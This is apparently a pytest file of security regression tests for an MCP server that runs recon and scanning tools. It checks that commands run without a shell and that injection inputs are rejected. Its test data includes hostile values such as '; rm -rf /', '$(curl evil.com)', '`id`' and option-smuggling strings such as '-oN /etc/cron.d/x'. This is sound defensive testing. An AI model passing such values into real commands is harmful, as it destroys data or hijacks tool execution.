"""
MCP Execution-Safety Harness (Pillar 3) — mitigates Risk #3.

The MCP boundary executes real security binaries. These are security
regression tests proving:

  1. subprocess is invoked with an argv LIST and never shell=True;
  2. argument/option-smuggling inputs ("-oN file", "--config evil",
     "; rm -rf /", "a b") are REJECTED at the boundary and never reach
     execution;
  3. legitimate inputs still pass validation and execute.
"""

import json

import pytest

import mcp_server


# ── 1. shell=False invariant ─────────────────────────────────────────────

def test_run_never_uses_shell(monkeypatch):
    """_run must call subprocess.run with a list and without shell=True."""
    calls = {}

    class _FakeProc:
        returncode = 0
        stdout = "ok"
        stderr = ""

    def _spy(cmd, *args, **kwargs):
        calls["cmd"] = cmd
        calls["shell"] = kwargs.get("shell", False)
        return _FakeProc()

    monkeypatch.setattr(mcp_server.subprocess, "run", _spy)
    mcp_server._run(["subfinder", "-d", "example.com"])

    assert isinstance(calls["cmd"], list), "command must be a list, not a shell string"
    assert calls["shell"] is False, "shell=True is forbidden on the tool boundary"


def test_user_value_stays_a_single_argv_token(monkeypatch):
    """A user value bound to a flag must remain exactly one argv token."""
    captured = {}

    class _FakeProc:
        returncode = 0
        stdout = ""
        stderr = ""

    def _capture(cmd, *a, **k):
        captured["cmd"] = cmd
        return _FakeProc()

    monkeypatch.setattr(mcp_server.subprocess, "run", _capture)
    # A weird-but-validation-passing host bound to -d stays one token.
    mcp_server._run(["subfinder", "-d", "weird.example.com"])
    assert captured["cmd"].count("weird.example.com") == 1


# ── 2. injection rejection ───────────────────────────────────────────────

MALICIOUS = [
    "-oN /etc/cron.d/x",
    "--config evil",
    "; rm -rf /",
    "a b",
    "$(curl evil.com)",
    "`id`",
    "https://x.com/\nhttps://evil.com",
]


@pytest.mark.parametrize("bad", MALICIOUS)
def test_host_tools_reject_malicious_input(monkeypatch, bad):
    """Positional-arg host tools must reject and NOT execute on bad input."""
    executed = {"ran": False}
    monkeypatch.setattr(mcp_server, "_run",
                        lambda *a, **k: executed.update(ran=True) or {"success": True})

    for tool in (mcp_server.subfinder_scan, mcp_server.gau_urls, mcp_server.amass_enum):
        res = json.loads(tool(bad))
        assert res.get("rejected") is True, f"{tool.__name__} accepted {bad!r}"
    assert executed["ran"] is False, "a malicious input reached execution"


@pytest.mark.parametrize("bad", MALICIOUS)
def test_url_tools_reject_malicious_input(monkeypatch, bad):
    executed = {"ran": False}
    monkeypatch.setattr(mcp_server, "_run",
                        lambda *a, **k: executed.update(ran=True) or {"success": True})

    for tool in (mcp_server.nuclei_scan, mcp_server.sqlmap_scan,
                 mcp_server.whatweb_detect, mcp_server.wafw00f_detect):
        res = json.loads(tool(bad))
        assert res.get("rejected") is True, f"{tool.__name__} accepted {bad!r}"
    assert executed["ran"] is False


def test_nmap_rejects_flag_injection(monkeypatch):
    """nmap takes a positional host; '--script=evil' must be rejected."""
    executed = {"ran": False}
    monkeypatch.setattr(mcp_server, "_run",
                        lambda *a, **k: executed.update(ran=True) or {"success": True})
    res = json.loads(mcp_server.nmap_scan("--script=http-evil"))
    assert res.get("rejected") is True
    assert executed["ran"] is False


def test_dnsx_rejects_record_type_smuggling(monkeypatch):
    executed = {"ran": False}
    monkeypatch.setattr(mcp_server, "_run",
                        lambda *a, **k: executed.update(ran=True) or {"success": True})
    res = json.loads(mcp_server.dnsx_resolve("example.com", record_type="A -oN /tmp/x"))
    assert res.get("rejected") is True
    assert executed["ran"] is False


# ── 3. legitimate inputs pass ────────────────────────────────────────────

def _spy_run(seen):
    def _run(cmd, *a, **k):
        seen["cmd"] = cmd
        return {"success": True, "output": ""}
    return _run


def test_legitimate_host_passes(monkeypatch):
    seen = {}
    monkeypatch.setattr(mcp_server, "_run", _spy_run(seen))
    mcp_server.subfinder_scan("api.example.com")
    assert "api.example.com" in seen["cmd"]


def test_legitimate_url_with_query_passes(monkeypatch):
    seen = {}
    monkeypatch.setattr(mcp_server, "_run", _spy_run(seen))
    mcp_server.sqlmap_scan("https://example.com/item?id=1&cat=2")
    assert any("id=1&cat=2" in tok for tok in seen["cmd"])
